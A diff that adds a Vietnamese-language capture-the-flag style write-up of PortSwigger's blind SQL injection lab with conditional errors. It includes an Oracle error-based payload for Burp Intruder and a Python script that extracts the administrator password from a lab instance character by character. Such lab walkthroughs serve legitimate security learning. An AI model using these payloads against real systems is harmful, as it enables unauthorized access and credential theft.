@@ -346,3 +346,66 @@ for i in range(1, 21):
 print(f"administrator:{password}") # administrator:yeuo9hasc1hmsq2rxltz
 
 ```
+
+## Lab 12: [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+>
+> **Hint**
+>
+> This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.
+
+Ở bài lab này, nếu chúng ta thử thêm kí tự `'` vào giá trị của cookie `TrackingId` thì thấy xuất hiện lỗi:
+
+![image](images/lab-12/lab-12.png)
+
+Thêm tiếp kí tự `'` vào, chúng ta thấy không còn lỗi nữa:
+
+![image](images/lab-12/lab-12-1.png)
+
+Như vậy, chúng ta có thể tìm được password dựa vào thông báo lỗi này.
+
+Thực hiện đổi giá trị của cookie `TrackingId` thành payload bên dưới để brute-force độ dài của password sử dụng Burp Intruder.
+
+```sql
+' || (SELECT CASE WHEN LENGTH(password)=§1§ THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') || '
+```
+
+Ở payload trên, chúng ta sử dụng subquery để lấy chuỗi rỗng khi độ dài password của người dùng `administrator` bằng một số nào đó, ngược lại sẽ tận dụng hàm `TO_CHAR(1/0)` để gây lỗi.
+
+![image](images/lab-12/lab-12-2.png)
+
+Chạy Intruder, chúng ta xác định được độ dài của password là 20:
+
+![image](images/lab-12/lab-12-3.png)
+
+Tiếp theo, chúng ta cần lấy lần lượt từng kí tự trong password rồi so sánh với một kí tự để kiểm tra, nếu không có lỗi thì chúng ta sẽ lấy kí tự đó.
+
+Chúng ta có thể viết script Python sau để nhanh chóng tìm được password.
+
+```python
+import requests
+import string
+
+url = "https://0a4000a50496098781107f6d00a500f7.web-security-academy.net/"
+charset = string.ascii_lowercase + string.digits
+password = ""
+
+for i in range(1, 21):
+    for j in charset:
+        cookie = {"TrackingId": f"' || (SELECT CASE WHEN SUBSTR(password, {i}, 1)='{j}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') || '"}
+        r = requests.get(url, cookies=cookie)
+        
+        if r.status_code == 200:
+            password += j
+            break
+
+print(f"administrator:{password}") # administrator:anvjib2zbhzn8fb0sbnc
+
+```
